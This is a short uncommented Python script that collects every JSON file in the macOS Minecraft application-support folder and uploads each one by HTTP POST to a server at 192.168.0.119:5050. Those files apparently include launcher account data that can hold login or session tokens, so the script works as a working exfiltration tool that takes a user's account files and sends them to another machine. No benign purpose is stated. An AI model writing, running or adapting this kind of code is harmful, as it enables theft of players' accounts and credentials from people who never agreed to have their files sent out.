import os
import requests

def find_json_files(directory):
    return [os.path.join(directory, file) for file in os.listdir(directory) if file.endswith('.json')]

def send_file_to_server(file_path, server_ip):
    url = f'http://{server_ip}:5050/upload'
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            response = requests.post(url, files=files)
            response.raise_for_status()
            print(f'Successfully sent {file_path} to {server_ip}. Response: {response.json()}')
    except requests.exceptions.RequestException as e:
        print(f'Failed to send {file_path} to {server_ip}. Error: {e}')

def main():
    pwd = os.getcwd()
    target_directory = os.path.join(pwd, 'Library', 'Application Support', 'minecraft')
    server_ip = '192.168.0.119'
    
    if not os.path.exists(target_directory):
        print(f'The directory {target_directory} does not exist.')
        return
    
    json_files = find_json_files(target_directory)
    
    if not json_files:
        print(f'No JSON files found in {target_directory}.')
        return
    
    for json_file in json_files:
        send_file_to_server(json_file, server_ip)

if __name__ == '__main__':
    main()
